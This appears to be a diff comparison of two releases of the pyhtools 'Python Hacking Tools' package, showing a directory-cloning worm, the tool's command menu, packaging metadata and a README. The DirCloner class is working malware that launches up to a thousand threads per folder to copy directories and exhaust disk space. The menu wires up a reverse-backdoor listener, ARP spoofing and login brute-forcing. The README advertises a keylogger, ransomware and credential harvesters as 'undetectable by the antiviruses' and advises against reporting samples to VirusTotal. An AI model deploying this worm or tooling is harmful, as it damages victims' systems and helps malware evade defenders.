-        args:
-            times (int): number of times a directory to be copied, default is 1000
-            start_after (int): seconds after which worm needs to be started, default is 0s
-            src (str): source path of the directory
-            dst (str): destination path of the directory
-
-        returns:
-            None
-        '''
-        time.sleep(start_after)
-        for iteration in range(times):
-            threading.Thread(target=self.clone, args=(iteration, src, dst)).start()
+import os
+import shutil
+import threading
+import time
+
+
+class DirCloner:
+    def __init__(self, root:str='') -> None:
+        # set path
+        if os.path.exists(root):
+            self.root = root
+        else:
+            self.root = os.path.dirname(__file__)
+        
+        # set os
+        self.os_name = os.name
+    
+
+    def set_clone_path(self, path:str) -> bool:
+        '''
+        description:
+            set path of the folder which needs to be cloned by the worm.
+        
+        args:
+            path (str): path of the folder
+        
+        returns:
+            bool
+        '''
+        if os.path.exists(path):
+            self.root = path
+            return True
+        return False
+
+
+    def get_curr_drive_folder(self,):
+        '''
+        description:
+            returns current drive folder location
+
+        args:
+            None
+
+        returns:
+            str
+        '''
+        if self.os_name == "nt":
+            path_list = self.root.split('\\')
+        else:
+            path_list = self.root.split('/')
+        path = os.path.join(path_list[0], os.path.sep, path_list[1])
+        return path
+
+
+    def clone(self,  number:int, src:str=None, dst:str=None) -> bool:
+        '''
+        description:
+            copies src tree to dst tree with error handling
+
+        args:
+            number (int): number to be appended to src if dst is not provided
+            src (str): source path of dir to be cloned, default is None
+            dst (str): destination path of cloned directory, default is None
+
+        returns:
+            bool
+        '''
+        src = self.root if src is None else src
+                        
+        dst = src + str(number) if dst is None else dst
+        
+        if os.path.exists(dst):
+            return False
+
+        # print data for debugging
+        # print(number)
+        # print(src)
+        # print(dst)
+        # print('-'*40)
+
+        # if any error occurs return false
+        try:
+            shutil.copytree(src=src, dst=dst)
+        except Exception as e:
+            print(e)
+            return False
+        return True
+
+
+    def clone_all_dirs(self, path:str=None, start_after:int=0, times:int=1000) -> bool:
+        '''
+        description:
+            clones all the directories specified in the path for specified times.
+        
+        args:
+            path (str): path of the root directory, default is None (which will be updated to root dir passed during obj creation)
+            start_after (int): seconds after which worm needs to be started, default is 0s
+            times (str): number of clones to be created of a particular directory, default is 1000
+        
+        returns:
+            None
+        '''
+        if path is None:
+            path = self.root
+        
+        if not os.path.exists(path):
+            return False
+        
+        curr_path = os.getcwd()
+        os.chdir(path)
+        
+        dirs_list = os.listdir()
+        for dir in dirs_list:
+            clone_path = os.path.join(path, dir)
+            self.clone_dir(times=times, start_after=start_after, src=clone_path) 
+
+        os.chdir(curr_path)
+
+
+    def clone_dir(self, times:int=1000, start_after:int=0, src:str=None, dst:str=None) -> None:
+        '''
+        description:
+            waits for specified time and then starts cloning the dir for specified time.
+
+        args:
+            times (int): number of times a directory to be copied, default is 1000
+            start_after (int): seconds after which worm needs to be started, default is 0s
+            src (str): source path of the directory
+            dst (str): destination path of the directory
+
+        returns:
+            None
+        '''
+        time.sleep(start_after)
+        for iteration in range(times):
+            threading.Thread(target=self.clone, args=(iteration, src, dst)).start()
```

### Comparing `pyhtools-2.2.1/pyhtools/UI/functions.py` & `pyhtools-2.2.2/pyhtools/UI/functions.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,196 +1,196 @@
-from asyncio.exceptions import CancelledError
-from prettytable import PrettyTable
-from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW, BACK_RED_BRIGHT_YELLOW, RESET_COLORS
-from pyhtools.evil_files.malwares.utils import send_mail
-
-
-import pyfiglet
-import os
-import sys
-import pyhtools.attackers.attackers as attacker
-import pyhtools.evil_files.malwares.reverse_backdoor.TCP.listener as listener
-
-__version = '2.1.0'
-
-def clrscr():
-    if os.name == 'nt':
-        os.system('cls')
-    elif os.name == 'posix':
-        os.system('clear')
-
-
-def banner():
-    '''
-    prints PyHTools Banner
-    '''
-    clrscr()
-    print(BRIGHT_YELLOW + pyfiglet.figlet_format('PyHTools'))
-    print(BRIGHT_YELLOW + '+' + '-'*42 + '+')
-    print(BRIGHT_WHITE + f'| written by dmdhrumilmistry\tpht v{__version} |')
-    print(BRIGHT_YELLOW + '+' + '-'*42 + '+')
-
-
-def print_help():
-    '''
-    prints commands with their brief description.
-    '''
-    print(BRIGHT_WHITE + 'Python Hacking Tools (PyHTools) (pht)')
-
-    help = PrettyTable(['Command', 'Description'])
-    help.align['Command'] = 'c'
-    help.align['Description'] = 'l'
-    # help.add_row(['',''])
-
-    help.add_row(['clear', 'clear console'])
-    help.add_row(['help', 'display help table'])
-    help.add_row(['close pht', 'exit PyHackingTools'])
-
-    help.add_row(['machngr', 'change mac address of the network interface'])
-    help.add_row(['arpspoofer', 'spoof the target by arp poisoning'])
-    help.add_row(['nwscan', 'scan for ip range in the network'])
-
-    help.add_row(
-        ['webspider', 'maps all the links which are related to root url on the website'])
-    help.add_row(
-        ['webcrawldirs', 'scan for valid directories of the website using a wordlist'])
-    help.add_row(
-        ['webcrawlsubdom', 'scan for valid subdomains of the website using a wordlist'])
-    help.add_row(['weblogin', 'bruteforce webpage login'])
-    help.add_row(['webvulnscan', 'scan for vulnerabilities on the website'])
-
-    # help.add_row(['',''])
-
-    help.add_row(['listener', 'start listener on specific LHOST and LPORT'])
-    help.add_row(['sendmail', 'send mail to specific email address'])
-
-    help.add_row(
-        ['gen exe', 'generate executables of reverse backdoor, keylogger, etc.'])
-
-    print(help)
-
-
-def send_mail_to(email, password, receiver, subject, body) -> bool:
-    '''
-    send mail
-    '''
-    print(BRIGHT_WHITE + '[*] Sending email...')
-    msg = f'Subject: {subject}\n{body}'
-    if send_mail(email, receiver, password, msg):
-        print(BRIGHT_YELLOW + '[\u2714] Mail Sent')
-    else:
-        print(BRIGHT_RED + '[\u274c] Unable to send mail.')
-
-
-def listener_option():
-    '''
-    executes commands to run listener option.
-    '''
-    host = input('[+] LHOST : ')
-    port = int(input('[+] LPORT : '))
-    lsnr = listener.Listener(host, port)
-    lsnr.run()
-
-
-def sendmail_option():
-    '''
-    executes commands to run send mail option.
-    '''
-    email = input('[+] gmail acc : ')
-    password = input('[+] password : ')
-    print('[!] if you want to send mail to yourself enter "self" (without quotes)')
-    receiver = input('[+] email to : ')
-    if receiver.lower() == 'self':
-        receiver = email
-    subject = input('[+] subject : ')
-    body = input('[+] body : ')
-    send_mail_to(email, password, receiver, subject, body)
-
-
-def machngr_option():
-    '''
-    executes commands to change mac address
-    '''
-    attacker.mac_changer()
-
-
-def generate_executable():
-    '''
-    executes commands to generate executables   
-    '''
-    print(BRIGHT_YELLOW +
-          '[-] Currently this feature is under test... Will update soon...')
-    print(BRIGHT_WHITE +
-          '[*] You can use scripts from malwares to manually generate evil files...')
-
-
-async def run():
-    '''
-    start PyHTools
-    '''
-    try:
-        while True:
-            cmd = input(BACK_RED_BRIGHT_YELLOW + 'pyhtools >>' +
-                        RESET_COLORS + ' ').lower().strip()
-
-            # BASIC UI COMMANDS
-            if cmd == 'close pht':
-                break
-
-            elif cmd == 'clear':
-                clrscr()
-
-            elif cmd == 'help':
-                print_help()
-
-            # MALWARES
-            elif cmd == 'listener':
-                listener_option()
-
-            elif cmd == 'sendmail':
-                sendmail_option()
-
-            elif cmd == 'gen exe':
-                generate_executable()
-
-            # NETWORK ATTACKERS
-            elif cmd == 'machngr':
-                machngr_option()
-
-            elif cmd == 'arpspoofer':
-                attacker.arpspoofer()
-
-            elif cmd == 'nwscan':
-                attacker.nw_scan()
-
-            # WEB ATTACKERS
-            elif cmd == 'webspider':
-                await attacker.webspider()
-
-            elif cmd == 'webcrawldirs':
-                await attacker.webcrawldirs()
-
-            elif cmd == 'webcrawlsubdom':
-                await attacker.webcrawlsubdom()
-
-            elif cmd == 'weblogin':
-                attacker.brute_login()
-
-            elif cmd == 'webvulnscan':
-                attacker.webvulnscan()
-
-            else:
-                print(BRIGHT_RED +
-                      '[-] Unknown command, use help to view valid commands')
-
-    except (EOFError, KeyboardInterrupt, CancelledError):
-        print()
-        print(BRIGHT_YELLOW +
-              "[\U0001f604] WE ARE NEVER RESPONSIBLE FOR YOUR ACTIONS!")
-        print(BRIGHT_RED + '[-] Closing PHT....')
-        sys.exit(0)
-
-
-if __name__ == '__main__':
-    banner()
-    print(BRIGHT_YELLOW +
-          '[\U0001f604] Run pyhtools.py to start Python Hacking Tools.')
+from asyncio.exceptions import CancelledError
+from prettytable import PrettyTable
+from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW, BACK_RED_BRIGHT_YELLOW, RESET_COLORS
+from pyhtools.evil_files.malwares.utils import send_mail
+
+
+import pyfiglet
+import os
+import sys
+import pyhtools.attackers.attackers as attacker
+import pyhtools.evil_files.malwares.reverse_backdoor.TCP.listener as listener
+
+__version = '2.1.0'
+
+def clrscr():
+    if os.name == 'nt':
+        os.system('cls')
+    elif os.name == 'posix':
+        os.system('clear')
+
+
+def banner():
+    '''
+    prints PyHTools Banner
+    '''
+    clrscr()
+    print(BRIGHT_YELLOW + pyfiglet.figlet_format('PyHTools'))
+    print(BRIGHT_YELLOW + '+' + '-'*42 + '+')
+    print(BRIGHT_WHITE + f'| written by dmdhrumilmistry\tpht v{__version} |')
+    print(BRIGHT_YELLOW + '+' + '-'*42 + '+')
+
+
+def print_help():
+    '''
+    prints commands with their brief description.
+    '''
+    print(BRIGHT_WHITE + 'Python Hacking Tools (PyHTools) (pht)')
+
+    help = PrettyTable(['Command', 'Description'])
+    help.align['Command'] = 'c'
+    help.align['Description'] = 'l'
+    # help.add_row(['',''])
+
+    help.add_row(['clear', 'clear console'])
+    help.add_row(['help', 'display help table'])
+    help.add_row(['close pht', 'exit PyHackingTools'])
+
+    help.add_row(['machngr', 'change mac address of the network interface'])
+    help.add_row(['arpspoofer', 'spoof the target by arp poisoning'])
+    help.add_row(['nwscan', 'scan for ip range in the network'])
+
+    help.add_row(
+        ['webspider', 'maps all the links which are related to root url on the website'])
+    help.add_row(
+        ['webcrawldirs', 'scan for valid directories of the website using a wordlist'])
+    help.add_row(
+        ['webcrawlsubdom', 'scan for valid subdomains of the website using a wordlist'])
+    help.add_row(['weblogin', 'bruteforce webpage login'])
+    help.add_row(['webvulnscan', 'scan for vulnerabilities on the website'])
+
+    # help.add_row(['',''])
+
+    help.add_row(['listener', 'start listener on specific LHOST and LPORT'])
+    help.add_row(['sendmail', 'send mail to specific email address'])
+
+    help.add_row(
+        ['gen exe', 'generate executables of reverse backdoor, keylogger, etc.'])
+
+    print(help)
+
+
+def send_mail_to(email, password, receiver, subject, body) -> bool:
+    '''
+    send mail
+    '''
+    print(BRIGHT_WHITE + '[*] Sending email...')
+    msg = f'Subject: {subject}\n{body}'
+    if send_mail(email, receiver, password, msg):
+        print(BRIGHT_YELLOW + '[\u2714] Mail Sent')
+    else:
+        print(BRIGHT_RED + '[\u274c] Unable to send mail.')
+
+
+def listener_option():
+    '''
+    executes commands to run listener option.
+    '''
+    host = input('[+] LHOST : ')
+    port = int(input('[+] LPORT : '))
+    lsnr = listener.Listener(host, port)
+    lsnr.run()
+
+
+def sendmail_option():
+    '''
+    executes commands to run send mail option.
+    '''
+    email = input('[+] gmail acc : ')
+    password = input('[+] password : ')
+    print('[!] if you want to send mail to yourself enter "self" (without quotes)')
+    receiver = input('[+] email to : ')
+    if receiver.lower() == 'self':
+        receiver = email
+    subject = input('[+] subject : ')
+    body = input('[+] body : ')
+    send_mail_to(email, password, receiver, subject, body)
+
+
+def machngr_option():
+    '''
+    executes commands to change mac address
+    '''
+    attacker.mac_changer()
+
+
+def generate_executable():
+    '''
+    executes commands to generate executables   
+    '''
+    print(BRIGHT_YELLOW +
+          '[-] Currently this feature is under test... Will update soon...')
+    print(BRIGHT_WHITE +
+          '[*] You can use scripts from malwares to manually generate evil files...')
+
+
+async def run():
+    '''
+    start PyHTools
+    '''
+    try:
+        while True:
+            cmd = input(BACK_RED_BRIGHT_YELLOW + 'pyhtools >>' +
+                        RESET_COLORS + ' ').lower().strip()
+
+            # BASIC UI COMMANDS
+            if cmd == 'close pht':
+                break
+
+            elif cmd == 'clear':
+                clrscr()
+
+            elif cmd == 'help':
+                print_help()
+
+            # MALWARES
+            elif cmd == 'listener':
+                listener_option()
+
+            elif cmd == 'sendmail':
+                sendmail_option()
+
+            elif cmd == 'gen exe':
+                generate_executable()
+
+            # NETWORK ATTACKERS
+            elif cmd == 'machngr':
+                machngr_option()
+
+            elif cmd == 'arpspoofer':
+                attacker.arpspoofer()
+
+            elif cmd == 'nwscan':
+                attacker.nw_scan()
+
+            # WEB ATTACKERS
+            elif cmd == 'webspider':
+                await attacker.webspider()
+
+            elif cmd == 'webcrawldirs':
+                await attacker.webcrawldirs()
+
+            elif cmd == 'webcrawlsubdom':
+                await attacker.webcrawlsubdom()
+
+            elif cmd == 'weblogin':
+                attacker.brute_login()
+
+            elif cmd == 'webvulnscan':
+                attacker.webvulnscan()
+
+            else:
+                print(BRIGHT_RED +
+                      '[-] Unknown command, use help to view valid commands')
+
+    except (EOFError, KeyboardInterrupt, CancelledError):
+        print()
+        print(BRIGHT_YELLOW +
+              "[\U0001f604] WE ARE NEVER RESPONSIBLE FOR YOUR ACTIONS!")
+        print(BRIGHT_RED + '[-] Closing PHT....')
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    banner()
+    print(BRIGHT_YELLOW +
+          '[\U0001f604] Run pyhtools.py to start Python Hacking Tools.')
```

### Comparing `pyhtools-2.2.1/pyproject.toml` & `pyhtools-2.2.2/pyproject.toml`

 * *Files 26% similar despite different names*

```diff
@@ -1,46 +1,50 @@
-[tool.poetry]
-name = "pyhtools"
-version = "2.2.1"
-description = "Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses."
-authors = ["Dhrumil Mistry <contact@dmdhrumilmistry.tech>"]
-license = "MIT"
-readme = "README.md"
-
-[tool.poetry.dependencies]
-python = "^3.10"
-aiodns = "^3.0.0"
-aiohttp = "^3.8.4"
-beautifulsoup4 = "^4.11.2"
-colorama = "^0.4.6"
-frida-tools = "^12.1.1"
-nuitka = "^1.4.8"
-paramiko = "^3.0.0"
-pure-python-adb = "^0.3.0.dev0"
-pyfiglet = "^0.8.post1"
-pynput = "^1.7.6"
-pytelegrambotapi = "^4.10.0"
-prettytable = "^3.6.0"
-psutil = "^5.9.4"
-requests = "^2.28.2"
-scapy = "^2.5.0"
-zstandard = "^0.20.0"
-netfilterqueue = {version = "^1.1.0", optional = true}
-wmi = {version = "^1.5.1", optional = true}
-
-
-[tool.poetry.extras]
-linux = ["netfilterqueue"]
-windows = ["wmi"]
-
-
-[tool.poetry.urls]
-"Home" = "https://github.com/dmdhrumilmistry/pyhtools"
-"Bug Tracker" = "https://github.com/dmdhrumilmistry/pyhtools/issues"
-"Support" = "https://github.com/sponsors/dmdhrumilmistry/"
-"PayPal" = "https://paypal.me/dmdhrumilmistry"
-
-
-[build-system]
-requires = ["poetry-core"]
-build-backend = "poetry.core.masonry.api"
-
+[tool.poetry]
+name = "pyhtools"
+version = "2.2.2"
+description = "Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses."
+authors = ["Dhrumil Mistry <contact@dmdhrumilmistry.tech>"]
+license = "MIT"
+readme = "README.md"
+
+[tool.poetry.dependencies]
+python = "^3.10"
+aiodns = "^3.0.0"
+aiohttp = "^3.8.4"
+beautifulsoup4 = "^4.11.2"
+colorama = "^0.4.6"
+frida-tools = "^12.1.1"
+nuitka = "^1.4.8"
+paramiko = "^3.0.0"
+pure-python-adb = "^0.3.0.dev0"
+pyfiglet = "^0.8.post1"
+pynput = "^1.7.6"
+pytelegrambotapi = "^4.10.0"
+prettytable = "^3.6.0"
+psutil = "^5.9.4"
+requests = "^2.28.2"
+scapy = "^2.5.0"
+zstandard = "^0.20.0"
+netfilterqueue = {version = "^1.1.0", optional = true}
+wmi = {version = "^1.5.1", optional = true}
+
+
+[tool.poetry.extras]
+linux = ["netfilterqueue"]
+windows = ["wmi"]
+
+
+[tool.poetry.urls]
+"Home" = "https://github.com/dmdhrumilmistry/pyhtools"
+"Bug Tracker" = "https://github.com/dmdhrumilmistry/pyhtools/issues"
+"Support" = "https://github.com/sponsors/dmdhrumilmistry/"
+"PayPal" = "https://paypal.me/dmdhrumilmistry"
+
+
+[tool.poetry.scripts]
+pyhtools = "pyhtools.__main__:start"
+
+
+[build-system]
+requires = ["poetry-core"]
+build-backend = "poetry.core.masonry.api"
+
```

### Comparing `pyhtools-2.2.1/README.md` & `pyhtools-2.2.2/README.md`

 * *Ordering differences only*

 * *Files 18% similar despite different names*

```diff
@@ -1,199 +1,199 @@
-# PyHTools
-
-![PyHTools Logo](https://i.ibb.co/CtwVV5T/Py-HTools-without-bg-cropped.png)
-
-- Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses.
-
-- These tools are written in python3, refer installation to install/download tools and its dependencies.
-
-- PyHTools comes with UI, but you can also use command line to use tools individually.
-
-**`NOTE` : The UI hasn't been updated yet with new tools, Refer examples for more information**
-
-
-## Disclaimer
-
-The disclaimer advises users to use the open source project for ethical and legitimate purposes only and refrain from using it for any malicious activities. The creators and contributors of the project are not responsible for any illegal activities or damages that may arise from the misuse of the project. Users are solely responsible for their use of the project and should exercise caution and diligence when using it. Any unauthorized or malicious use of the project may result in legal action and other consequences.
-
-[Read More](./DISCLAIMER.md)
-
-
-## Join Our Discord Community
-
-[![Join our Discord server!](https://invidget.switchblade.xyz/DJrnAg4nv2)](http://discord.gg/DJrnAg4nv2)
-
-## How To Videos
-
-- Gain access to remote shell over the Internet using HTTP Backdoor
-
-  [![YT Thumbnail](https://img.youtube.com/vi/Wg-PiywAqyw/maxresdefault.jpg)](https://youtu.be/Wg-PiywAqyw)
-
-## Installation
-
-### Using pip
-
-- Install main branch using pip
-
-  ```bash
-  python3 -m pip install git+https://github.com/dmdhrumilmistry/pyhtools.git
-  ```
-
-- Install Release from PyPi
-
-  ```bash
-  # without options
-  python3 -m pip install pyhtools
-
-  # for windows
-  python3 -m pip install pyhtools[windows]
-
-  # for linux
-  python3 -m pip install pyhtools[linux]
-  ```
-
-### Manual Method
-
-- Open terminal
-
-- Install git package
-
-  ```bash
-  sudo apt install git python3 -y
-  ```
-
-- Install [Poetry](https://python-poetry.org/docs/master#installing-with-the-official-installer)
-
-- clone the repository to your machine
-
-  ```bash
-  git clone https://github.com/dmdhrumilmistry/pyhtools.git
-  ```
-
-- Change directory
-
-  ```bash
-  cd pyhtools
-  ```
-
-- install with poetry
-
-  ```bash
-  # without options
-  poetry install
-
-  # for windows
-  poetry install -E windows
-
-  # for linux
-  poetry install -E linux
-  ```
-
-## Start PyHTools
-
-- run pyhtools.py
-
-  ```bash
-  python3 -m pyhtools
-  ```
-
-- to get all the commands use `help`
-
-  ```bash
-  pyhtools >> help
-  ```
-
-> If you're using Termux or windows, then use `pip` instead of `pip3`.  
-> Few features are only for linux os, hence they might not work on windows and require admin priviliges.
-
-### Open In Google Cloud Shell
-
-- Temporary Session  
-  [![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2Fdmdhrumilmistry%2Fpyhtools&ephemeral=true&show=terminal&cloudshell_print=./DISCLAIMER.md)
-- Perisitent Session  
-  [![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2Fdmdhrumilmistry%2Fpyhtools&ephemeral=false&show=terminal&cloudshell_print=./DISCLAIMER.md)
-
-## Package Tools and Features
-
-### Attackers
-
-- `For Networks`
-
-  - Network Scanner
-  - Mac changer
-  - ARP Spoofing
-  - DNS spoofing
-  - Downloads Replacer
-  - Network Jammer
-  - Pkt Sniffer
-  - Code Injector
-
-- `For Websites`
-
-  - Login Guesser (Login Bruteforcer)
-  - Web Spider
-  - Web crawler (detects dirs | subdomains)
-  - Web Vulnerablity Scanner
-
-- `For Android`
-  - mitm
-    - Custom Certificate Pinner
-
-### Detectors
-
-- ARP Spoof Detector
-
-### Malwares/Trojans/Payloads/Ransomwares/Worms
-
-- Email Sender (reporter)
-- Downloader
-- Wireless Password Harvester
-- Credential Harvester
-- Keylogger (dlogs)
-- Reverse Backdoors
-  - TCP
-  - HTTP
-- Download and Execute
-- Telegram Data Harvester
-- DMSecRansomware
-- Telegram Remote Code Executor
-- DirCloner
-
-> **NOTE:** Do not upload/send/report malwares to anti virus services such as `VirusTotal`. This will make program detectable
-
-## Project Updates
-
-- [View](https://github.com/users/dmdhrumilmistry/projects/2/views/1)
-
-## How to Package a Evil Files
-
-- [Example Script](./examples/EvilFiles)
-- [View How to create a Trojan](./HowTo/Malwares/CreateTrojanPackage.md)
-- [Generator Script](./examples/EvilFiles/generatorScript.py)
-
-`Note`: On linux host machines, user needs to install `patchelf` package. Install using below command.
-
-```bash
-apt/dnf/yum install patchelf
-```
-
-> Above command needs root privileges.
-
-## Have any Ideas 💡 or issue
-
-- Create an issue
-- Fork the repo, update script and create a Pull Request
-
-## Contributing
-
-Refer [CONTRIBUTIONS.md](/.github/CONTRIBUTING.md) for contributing to the project.
-
-## LICENSE
-
-PyHTools is distributed under `MIT` License. Refer [License](/LICENSE) for more information.
-
-## Connect With Me
-
-|                                                                                                                       |                                                       Platforms                                                       |                                                                                                                                        |
-| :-------------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------: |
-|       [![GitHub](https://img.shields.io/badge/Github-dmdhrumilmistry-333)](https://github.com/dmdhrumilmistry)        | [![LinkedIn](https://img.shields.io/badge/LinkedIn-Dhrumil%20Mistry-4078c0)](https://linkedin.com/in/dmdhrumilmistry) |             [![Twitter](https://img.shields.io/badge/Twitter-dmdhrumilmistry-4078c0)](https://twitter.com/dmdhrumilmistry)             |
-| [![Instagram](https://img.shields.io/badge/Instagram-dmdhrumilmistry-833ab4)](https://instagram.com/dmdhrumilmistry/) |     [![Blog](https://img.shields.io/badge/Blog-Dhrumil%20Mistry-bd2c00)](https://dmdhrumilmistry.github.io/blog)      | [![Youtube](https://img.shields.io/badge/YouTube-Dhrumil%20Mistry-critical)](https://www.youtube.com/channel/UChbjrRvbzgY3BIomUI55XDQ) |
+# PyHTools
+
+![PyHTools Logo](https://i.ibb.co/CtwVV5T/Py-HTools-without-bg-cropped.png)
+
+- Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses.
+
+- These tools are written in python3, refer installation to install/download tools and its dependencies.
+
+- PyHTools comes with UI, but you can also use command line to use tools individually.
+
+**`NOTE` : The UI hasn't been updated yet with new tools, Refer examples for more information**
+
+
+## Disclaimer
+
+The disclaimer advises users to use the open source project for ethical and legitimate purposes only and refrain from using it for any malicious activities. The creators and contributors of the project are not responsible for any illegal activities or damages that may arise from the misuse of the project. Users are solely responsible for their use of the project and should exercise caution and diligence when using it. Any unauthorized or malicious use of the project may result in legal action and other consequences.
+
+[Read More](./DISCLAIMER.md)
+
+
+## Join Our Discord Community
+
+[![Join our Discord server!](https://invidget.switchblade.xyz/DJrnAg4nv2)](http://discord.gg/DJrnAg4nv2)
+
+## How To Videos
+
+- Gain access to remote shell over the Internet using HTTP Backdoor
+
+  [![YT Thumbnail](https://img.youtube.com/vi/Wg-PiywAqyw/maxresdefault.jpg)](https://youtu.be/Wg-PiywAqyw)
+
+## Installation
+
+### Using pip
+
+- Install main branch using pip
+
+  ```bash
+  python3 -m pip install git+https://github.com/dmdhrumilmistry/pyhtools.git
+  ```
+
+- Install Release from PyPi
+
+  ```bash
+  # without options
+  python3 -m pip install pyhtools
+
+  # for windows
+  python3 -m pip install pyhtools[windows]
+
+  # for linux
+  python3 -m pip install pyhtools[linux]
+  ```
+
+### Manual Method
+
+- Open terminal
+
+- Install git package
+
+  ```bash
+  sudo apt install git python3 -y
+  ```
+
+- Install [Poetry](https://python-poetry.org/docs/master#installing-with-the-official-installer)
+
+- clone the repository to your machine
+
+  ```bash
+  git clone https://github.com/dmdhrumilmistry/pyhtools.git
+  ```
+
+- Change directory
+
+  ```bash
+  cd pyhtools
+  ```
+
+- install with poetry
+
+  ```bash
+  # without options
+  poetry install
+
+  # for windows
+  poetry install -E windows
+
+  # for linux
+  poetry install -E linux
+  ```
+
+## Start PyHTools
+
+- run pyhtools.py
+
+  ```bash
+  python3 -m pyhtools
+  ```
+
+- to get all the commands use `help`
+
+  ```bash
+  pyhtools >> help
+  ```
+
+> If you're using Termux or windows, then use `pip` instead of `pip3`.  
+> Few features are only for linux os, hence they might not work on windows and require admin priviliges.
+
+### Open In Google Cloud Shell
+
+- Temporary Session  
+  [![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2Fdmdhrumilmistry%2Fpyhtools&ephemeral=true&show=terminal&cloudshell_print=./DISCLAIMER.md)
+- Perisitent Session  
+  [![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https%3A%2F%2Fgithub.com%2Fdmdhrumilmistry%2Fpyhtools&ephemeral=false&show=terminal&cloudshell_print=./DISCLAIMER.md)
+
+## Package Tools and Features
+
+### Attackers
+
+- `For Networks`
+
+  - Network Scanner
+  - Mac changer
+  - ARP Spoofing
+  - DNS spoofing
+  - Downloads Replacer
+  - Network Jammer
+  - Pkt Sniffer
+  - Code Injector
+
+- `For Websites`
+
+  - Login Guesser (Login Bruteforcer)
+  - Web Spider
+  - Web crawler (detects dirs | subdomains)
+  - Web Vulnerablity Scanner
+
+- `For Android`
+  - mitm
+    - Custom Certificate Pinner
+
+### Detectors
+
+- ARP Spoof Detector
+
+### Malwares/Trojans/Payloads/Ransomwares/Worms
+
+- Email Sender (reporter)
+- Downloader
+- Wireless Password Harvester
+- Credential Harvester
+- Keylogger (dlogs)
+- Reverse Backdoors
+  - TCP
+  - HTTP
+- Download and Execute
+- Telegram Data Harvester
+- DMSecRansomware
+- Telegram Remote Code Executor
+- DirCloner
+
+> **NOTE:** Do not upload/send/report malwares to anti virus services such as `VirusTotal`. This will make program detectable
+
+## Project Updates
+
+- [View](https://github.com/users/dmdhrumilmistry/projects/2/views/1)
+
+## How to Package a Evil Files
+
+- [Example Script](./examples/EvilFiles)
+- [View How to create a Trojan](./HowTo/Malwares/CreateTrojanPackage.md)
+- [Generator Script](./examples/EvilFiles/generatorScript.py)
+
+`Note`: On linux host machines, user needs to install `patchelf` package. Install using below command.
+
+```bash
+apt/dnf/yum install patchelf
+```
+
+> Above command needs root privileges.
+
+## Have any Ideas 💡 or issue
+
+- Create an issue
+- Fork the repo, update script and create a Pull Request
+
+## Contributing
+
+Refer [CONTRIBUTIONS.md](/.github/CONTRIBUTING.md) for contributing to the project.
+
+## LICENSE
+
+PyHTools is distributed under `MIT` License. Refer [License](/LICENSE) for more information.
+
+## Connect With Me
+
+|                                                                                                                       |                                                       Platforms                                                       |                                                                                                                                        |
+| :-------------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------: |
+|       [![GitHub](https://img.shields.io/badge/Github-dmdhrumilmistry-333)](https://github.com/dmdhrumilmistry)        | [![LinkedIn](https://img.shields.io/badge/LinkedIn-Dhrumil%20Mistry-4078c0)](https://linkedin.com/in/dmdhrumilmistry) |             [![Twitter](https://img.shields.io/badge/Twitter-dmdhrumilmistry-4078c0)](https://twitter.com/dmdhrumilmistry)             |
+| [![Instagram](https://img.shields.io/badge/Instagram-dmdhrumilmistry-833ab4)](https://instagram.com/dmdhrumilmistry/) |     [![Blog](https://img.shields.io/badge/Blog-Dhrumil%20Mistry-bd2c00)](https://dmdhrumilmistry.github.io/blog)      | [![Youtube](https://img.shields.io/badge/YouTube-Dhrumil%20Mistry-critical)](https://www.youtube.com/channel/UChbjrRvbzgY3BIomUI55XDQ) |
```

### Comparing `pyhtools-2.2.1/PKG-INFO` & `pyhtools-2.2.2/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pyhtools
-Version: 2.2.1
+Version: 2.2.2
 Summary: Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses.
 License: MIT
 Author: Dhrumil Mistry
 Author-email: contact@dmdhrumilmistry.tech
 Requires-Python: >=3.10,<4.0
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
```

